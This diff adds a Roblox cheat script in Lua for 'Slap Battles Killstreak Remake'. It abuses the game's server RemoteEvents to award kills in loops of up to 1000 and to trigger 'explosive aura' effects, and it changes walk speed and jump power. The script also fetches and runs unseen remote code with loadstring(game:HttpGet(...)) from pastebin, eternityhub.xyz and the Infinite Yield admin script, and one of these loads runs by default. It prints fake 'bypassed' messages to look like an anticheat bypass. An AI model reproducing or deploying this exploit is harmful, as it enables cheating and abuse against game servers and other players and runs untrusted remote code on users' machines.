@@ -1,0 +1,650 @@
+
+pcall(function()
+_G.ToKeys = false
+_G.RobloxEditor = true
+_G.ToKeysAndUIAndRE = false
+_G.LoadingScreen = false
+end)
+
+
+v1 = pcall
+v1(function()
+    for i,v in pairs(game.Players:GetChildren()) do
+        name = tostring(v.Name)
+        print('Player[true]: '..name..'.')
+    end
+end)
+
+print"bypassed"
+
+pcall(function()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = 'Tip',
+        Text = 'After loading screen, script may take some minutes to load.',
+        Duration = 5
+    })
+end)
+
+function new_temp()
+    -- Gui to Lua
+    -- Version: 3.2
+
+    -- Instances:
+
+    local Loading = Instance.new("ScreenGui")
+    local MainFrame = Instance.new("Frame")
+    local Title = Instance.new("TextLabel")
+    local Dots = Instance.new("Frame")
+    local Dot1 = Instance.new("Frame")
+    local UICorner = Instance.new("UICorner")
+    local InsideDot = Instance.new("Frame")
+    local UICorner_2 = Instance.new("UICorner")
+    local Dot2 = Instance.new("Frame")
+    local UICorner_3 = Instance.new("UICorner")
+    local InsideDot_2 = Instance.new("Frame")
+    local UICorner_4 = Instance.new("UICorner")
+    local Dot3 = Instance.new("Frame")
+    local UICorner_5 = Instance.new("UICorner")
+    local InsideDot_3 = Instance.new("Frame")
+    local UICorner_6 = Instance.new("UICorner")
+    local Bar = Instance.new("Frame")
+    local Bar2 = Instance.new("Frame")
+    local UICorner_7 = Instance.new("UICorner")
+    local UICorner_8 = Instance.new("UICorner")
+    local Percentage = Instance.new("TextLabel")
+    local EndSequence = Instance.new("Frame")
+
+    --Properties:
+
+    Loading.Name = "Loading"
+    Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    Loading.ResetOnSpawn = false
+
+    MainFrame.Name = "MainFrame"
+    MainFrame.Parent = Loading
+    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Size = UDim2.new(1, 0, 1, 0)
+
+    Title.Name = "Title"
+    Title.Parent = MainFrame
+    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Title.BackgroundTransparency = 1.000
+    Title.Position = UDim2.new(0.0648983866, 0, 0.151675403, 0)
+    Title.Size = UDim2.new(0.83702296, 0, 0.232815996, 0)
+    Title.Font = Enum.Font.FredokaOne
+    Title.Text = "Slap Battles Killstreak Remake"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextScaled = true
+    Title.TextSize = 14.000
+    Title.TextWrapped = true
+
+    Dots.Name = "Dots"
+    Dots.Parent = MainFrame
+    Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Dots.BackgroundTransparency = 1.000
+    Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
+    Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
+
+    Dot1.Name = "Dot1"
+    Dot1.Parent = Dots
+    Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
+    Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
+
+    UICorner.CornerRadius = UDim.new(0.5, 0)
+    UICorner.Parent = Dot1
+
+    InsideDot.Name = "InsideDot"
+    InsideDot.Parent = Dot1
+    InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
+    InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+    UICorner_2.CornerRadius = UDim.new(0.5, 0)
+    UICorner_2.Parent = InsideDot
+
+    Dot2.Name = "Dot2"
+    Dot2.Parent = Dots
+    Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
+    Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
+
+    UICorner_3.CornerRadius = UDim.new(0.5, 0)
+    UICorner_3.Parent = Dot2
+
+    InsideDot_2.Name = "InsideDot"
+    InsideDot_2.Parent = Dot2
+    InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
+    InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+    UICorner_4.CornerRadius = UDim.new(0.5, 0)
+    UICorner_4.Parent = InsideDot_2
+
+    Dot3.Name = "Dot3"
+    Dot3.Parent = Dots
+    Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
+    Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
+
+    UICorner_5.CornerRadius = UDim.new(0.5, 0)
+    UICorner_5.Parent = Dot3
+
+    InsideDot_3.Name = "InsideDot"
+    InsideDot_3.Parent = Dot3
+    InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
+    InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+    UICorner_6.CornerRadius = UDim.new(0.5, 0)
+    UICorner_6.Parent = InsideDot_3
+
+    Bar.Name = "Bar"
+    Bar.Parent = MainFrame
+    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Bar.BorderSizePixel = 0
+    Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
+    Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
+
+    Bar2.Name = "Bar2"
+    Bar2.Parent = Bar
+    Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    Bar2.BorderSizePixel = 0
+    Bar2.Size = UDim2.new(0, 0, 1, 0)
+
+    UICorner_7.CornerRadius = UDim.new(0.5, 0)
+    UICorner_7.Parent = Bar2
+
+    UICorner_8.CornerRadius = UDim.new(0.5, 0)
+    UICorner_8.Parent = Bar
+
+    Percentage.Name = "Percentage"
+    Percentage.Parent = Bar
+    Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Percentage.BackgroundTransparency = 1.000
+    Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
+    Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
+    Percentage.Font = Enum.Font.FredokaOne
+    Percentage.Text = "0%"
+    Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Percentage.TextScaled = true
+    Percentage.TextSize = 14.000
+    Percentage.TextWrapped = true
+
+    EndSequence.Name = "EndSequence"
+    EndSequence.Parent = Loading
+    EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    EndSequence.BorderSizePixel = 0
+    EndSequence.Position = UDim2.new(1, 0, 0, 0)
+    EndSequence.Size = UDim2.new(1, 0, 1, 0)
+
+    -- Scripts:
+
+    local function YCATKQ_fake_script() -- Dots.Dots 
+        local script = Instance.new('LocalScript', Dots)
+
+        while true do
+            wait(0.25)
+            script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
+            wait(0.25)
+            script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
+            wait(0.25)
+            script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
+            wait(0.25)
+            script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
+            wait(0.25)
+            script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
+            wait(0.25)
+            script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
+            if not script.Parent.Dot1 or script.Parent.Dot2 or script.Parent.Dot3 then return end
+        end
+    end
+    coroutine.wrap(YCATKQ_fake_script)()
+    local function CRWWDJQ_fake_script() -- MainFrame.Manager 
+        local script = Instance.new('LocalScript', MainFrame)
+
+        local bar = script.Parent.Bar
+        local insidebar = bar.Bar2
+        local percentage = bar.Percentage
+        
+        wait(5)
+        insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 20, true)
+        wait(20)
+        script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
+        wait(3)
+        script.Parent.Visible = false
+        script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(-1,0,0,0), "InOut", "Quad", 3, true)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
+        wait(3)
+        script.Parent.Parent.Parent.Loading:Destroy()
+    end
+    coroutine.wrap(CRWWDJQ_fake_script)()
+    local function WRULM_fake_script() -- Percentage.Percentage 
+        local script = Instance.new('LocalScript', Percentage)
+
+        wait(5)
+        for i = 1,100 do
+            script.Parent.Text = i.."%"
+            wait(0.2)
+        end
+    end
+    coroutine.wrap(WRULM_fake_script)()
+    local function YIMKFU_fake_script() -- Loading.DefaultUI 
+        local script = Instance.new('LocalScript', Loading)
+
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+    end
+    coroutine.wrap(YIMKFU_fake_script)()
+end
+if _G.LoadingScreen == true then
+    new_temp()
+
+    repeat task.wait() until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("Loading")
+end
+
+local WP = {
+    ["SlapBattlesKS"] = 11601030184
+}
+
+if game.PlaceId ~= WP["SlapBattlesKS"] then
+return
+end
+
+if not game.Players.LocalPlayer.leaderstats then
+repeat task.wait() until game.Players.LocalPlayer.leaderstats
+end
+
+for i,v in pairs(game:GetDescendants()) do
+    local abc = tostring(v.Name)
+    print('Hooked: _'..abc..'')
+end
+
+
+print'to toggle ui press F xd owner fucking dumb jk sike'
+
+
+
+
+if _G.ToKeysAndUIAndRE == true then
+loadstring(game:HttpGet("https://pastebin.com/raw/W055Mu4b"))()
+loadstring(game:HttpGet("https://eternityhub.xyz/HostStuff/JayzRoblox.lua"))()
+end
+
+function whyisitsolongomgimgonnacry()
+    local wordstable = {
+          ["OtherKey"] = 'OtherKey: m',
+          ["RandomKey"] = 'RandomKey: c',
+          ["EventKey"] = 'EventKey: r',
+          ["killsKey"] = 'killsKey: n',
+          ["deadkey"] = 'deadkey: p',
+          ["rejoinkey"] = 'rejoinkey: h',
+          ["anchorkey"] = 'anchorkey: j',
+          ["unanchorkey"] = 'unanchorkey: k',
+          ["BIG_KILLS_OMG"] = 'BIG_KILLS_OMG: u',
+          ["Fivekills"] = 'Fivekills: ',
+          ["Legit_Crocs"] = 'Legit_Crocs: v',
+          ["dw"] = 'dw: z',
+          ["Fifty_kills"] = 'Fifty_kills: f',
+          ["lenghty"] = 'lenghty: u'
+    }
+    for i,v in pairs(wordstable) do
+        warn(v)
+    end
+end
+
+
+pcall(function(p1, p2, p3)
+    whyisitsolongomgimgonnacry()
+    if p1 == nil then
+        p1 = 'Hi'
+    end
+    if p2 == nil then
+        p2 = 'Llo'
+    end
+    if p3 == nil then
+        p3 = 'World'
+    end
+    print(p1, p2, p3)
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if _G.ToKeys == true then
+    local Event = game:GetService("ReplicatedStorage").ReaperEvents.uivisible3
+    local RandomEvent = game:GetService("ReplicatedStorage").KillstreakEvents.kick
+    local Other = game:GetService("ReplicatedStorage").KillstreakEvents.ban
+    local kills = game:GetService("ReplicatedStorage").RageEvents.test
+    local doesnt_work = game:GetService("ReplicatedStorage").SlapStreakEvents.Slaps100
+    local _50_Kills = game:GetService("ReplicatedStorage").TimelessEvents.test2
+    local Player = game.Players.LocalPlayer
+    local Mouse = Player:GetMouse()
+    local OtherKey = 'm'
+    local RandomKey = 'c'
+    local EventKey = 'r'
+    local killsKey = 'n'
+    local deadkey = 'p'
+    local rejoinkey = 'h'
+    local anchorkey = 'j'
+    local unanchorkey = 'k'
+    local BIG_KILLS_OMG = 'u'
+    local Fivekills = 'g'
+    local crocs = 'b'
+    local Legit_Crocs = 'v'
+    local dw = 'z'
+    local Fifty_Kills = 'f'
+    local lengthy = 'u'
+    function lenghty_Fifty_Kills()
+    for i=1,30 do
+    _50_Kills:FireServer()
+    end
+    end
+
+    Mouse.KeyDown:Connect(function(k)
+    if k==lengthy then
+    lenghty_Fifty_Kills()
+    end
+    end)
+
+    Mouse.KeyDown:Connect(function(k)
+        if k == OtherKey then
+            Other:FireServer()
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == EventKey then
+            Event:FireServer()
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == RandomKey then
+            RandomEvent:FireServer()
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == killsKey then
+            kills:FireServer()
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == deadkey then
+            game.Players.LocalPlayer.Character.Humanoid.Health = 0
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == rejoinkey then
+           local pi = 11601030184
+           local plr = game.Players.LocalPlayer
+           local tps = game:GetService("TeleportService")
+           tps:Teleport(pi, plr) 
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == anchorkey then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == unanchorkey then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == BIG_KILLS_OMG then
+            for i=1,1000 do
+                kills:FireServer()
+            end
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == Fivekills then
+            for i=1,500 do
+                kills:FireServer()
+            end
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == crocs then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == Legit_Crocs then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 28
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == dw then
+            doesnt_work:FireServer()
+        end
+    end)
+    Mouse.KeyDown:Connect(function(k)
+        if k == Fifty_Kills then
+            _50_Kills:FireServer() 
+        end
+    end)
+else
+    --[[pcall(function()
+        local leaderstats = Player.leaderstats
+        local Kills = leaderstats.Kills
+        local Glove = leaderstats.Glove
+        Kills:GetPropertyChangedSignal("Value"):Connect(function()
+            game.StarterGui:SetCore("SendNotification", {
+                Title = 'Kills',
+                Text = 'You now have: ' ..Kills.Value..' Kills.',
+                Duration = 1
+            })
+        end)
+        Glove:GetPropertyChangedSignal("Value"):Connect(function()
+            game.StarterGui:SetCore("SendNotification", {
+                Title = 'Glove',
+                Text = 'You have equipped: ' ..tostring(Glove.Value)..'.',
+                Duration = 1
+            })
+        end)
+    end)
+    ]]
+    pcall(function(p1, p2, p3)
+    print(p1, p2, p3)
+    end)
+
+    local function External()
+        notif = function(title,text,duration)
+            game.StarterGui:SetCore("SendNotification", {
+                Title = title,
+                Text = text,
+                Duration = duration
+            })
+        end
+        print'This is made by jigglebasketballz, tracks players kills and gloves.'
+        print'If you are gonna showcase CREDIT!!! or show console lol'
+        wait(1)
+        for i,plr in pairs(game.Players:GetChildren()) do
+            local Pleyer = plr
+            local Leaderstats = Pleyer.leaderstats
+            local Kills = Leaderstats.Kills
+            local Glove = Leaderstats.Glove
+            Kills:GetPropertyChangedSignal("Value"):Connect(function()
+                notif('Kills', Pleyer.Name..' now has: ' ..tostring(Kills.Value)..' kills.', 1)
+            end)
+            Glove:GetPropertyChangedSignal("Value"):Connect(function()
+                notif('Glove', Pleyer.Name..' equipped the glove: ' ..tostring(Glove.Value)..'.', 1)
+            end)
+        end
+    end
+
+    External()
+
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+    local Window = Library.CreateLib("Slap Battles Killstreak Remake", "Sentinel")
+    local Info = Window:NewTab("Info")
+    local InfoSection = Info:NewSection("Information about script.")
+    InfoSection:NewLabel("Currently as: " .. game.Players.LocalPlayer.Name ..' ')
+    InfoSection:NewLabel("Account has been created " .. tostring(game.Players.LocalPlayer.AccountAge) ..' days ago.')
+    InfoSection:NewLabel("Your kills: " ..tostring(game.Players.LocalPlayer.leaderstats.Kills.Value)..'.')
+    local Target = InfoSection:NewLabel("Current Glove: " ..tostring(game.Players.LocalPlayer.leaderstats.Glove.Value)..'.')
+    game.Players.LocalPlayer.leaderstats.Glove:GetPropertyChangedSignal("Value"):Connect(function()
+        Target:UpdateLabel("Current Glove: " ..tostring(game.Players.LocalPlayer.leaderstats.Glove.Value)..'.')
+    end)
+    InfoSection:NewLabel("To enable KeyBind mode. Read:")
+    InfoSection:NewLabel("You have to set _G.ToKeys to true.")
+    InfoSection:NewLabel("Look at the top and you'll see keys.")
+
+
+    local lolcat = Window:NewTab("Abusing")
+    local lolcatSection = lolcat:NewSection("Abusing lol")
+    lolcatSection:NewButton("Free Kills (info)", "use with killstreak XD", function()
+        a = game:GetService("ReplicatedStorage").RageEvents.test
+        a:FireServer()
+    end)
+    lolcatSection:NewButton("50 Kills (info)", "only give kill on leaderstat, killsterak funi", function()
+        a = game:GetService("ReplicatedStorage").TimelessEvents.test2
+        a:FireServer()
+    end)
+    lolcatSection:NewButton("Explosive Aura (info)", "funi XDD", function()
+        a = game:GetService("ReplicatedStorage").KillstreakEvents.kick
+        a:FireServer()
+    end)
+    lolcatSection:NewButton("Explosive Aura 2", "pretty funi", function()
+        a = game:GetService("ReplicatedStorage").KillstreakEvents.ban
+        a:FireServer()
+    end)
+    lolcatSection:NewButton("Explosive Aura 3", "this is big", function()
+        a = game:GetService("ReplicatedStorage").ReaperEvents.uivisible3
+        a:FireServer()
+    end)
+
+    local Player = Window:NewTab("Player")
+    local PlayerSection = Player:NewSection("Advantages for yourself.")
+    PlayerSection:NewTextBox("WalkSpeed", "Put a number into the text.", function(val)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val
+    end)
+    PlayerSection:NewTextBox("JumpPower", "Put a number into the text.", function(val)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = val
+    end)
+
+    local Other = Window:NewTab("Other")
+    local OtherSec = Other:NewSection("Random stuff ig.")
+
+    OtherSec:NewKeybind("Toggle the UI", "You can customize the key.", Enum.KeyCode.F, function()
+        Library:ToggleUI()
+    end)
+    OtherSec:NewKeybind("Blatant Crocs", "lmao", Enum.KeyCode.B, function()
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+    end)
+    OtherSec:NewKeybind("Legit Crocs", "lmao", Enum.KeyCode.V, function()
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 28
+    end)
+    OtherSec:NewKeybind("Explosive LOL (info)", "Equip timeless for this", Enum.KeyCode.M, function()
+        game:GetService("ReplicatedStorage").TimelessEvents.time2200:FireServer()
+    end)
+    OtherSec:NewKeybind("Freeze in air", "just like tab glitch", Enum.KeyCode.J, function()
+        local p1 = game
+        local p2 = p1.Players
+        local p3 = p2.LocalPlayer
+        p4 = p3.Character
+        local p5 = p4.HumanoidRootPart
+        p5.Anchored = true
+    end)
+    OtherSec:NewKeybind("Unfreeze", "why yo reading this bruv..", Enum.KeyCode.K, function()
+        local p1 = game
+        local p2 = p1.Players
+        local p3 = p2.LocalPlayer
+        p4 = p3.Character
+        local p5 = p4.HumanoidRootPart
+        p5.Anchored = false
+    end)
+
+    function Load_IY()
+    print'Loaded Infinite Yield'
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end
+    OtherSec:NewKeybind("Rejoin", "why yo reading this bruv...", Enum.KeyCode.H, function()
+        local pi = 11601030184
+        local plr = game.Players.LocalPlayer
+        local tps = game:GetService("TeleportService")
+        tps:Teleport(pi, plr) 
+    end)
+    OtherSec:NewButton("Load IY", "easy", function()
+        Load_IY()
+    end)
+    
+    
+pcall(function() --credits to JayzRoblox for creating the script :D
+    if _G.RobloxEditor == true then
+        loadstring(game:HttpGet("https://eternityhub.xyz/HostStuff/JayzRoblox.lua"))()
+    else
+        print'doesnt want to load XD'
+    end
+end)
+
+pcall(function()
+game:GetService("CoreGui").ThemeProvider.TopBarFrame.LeftFrame.MenuIcon.Visible = true
+end)
+
+end
+
+game.Players.LocalPlayer.Character.Humanoid.Health = 0 --to look like i bypassed anticheat woo!!!
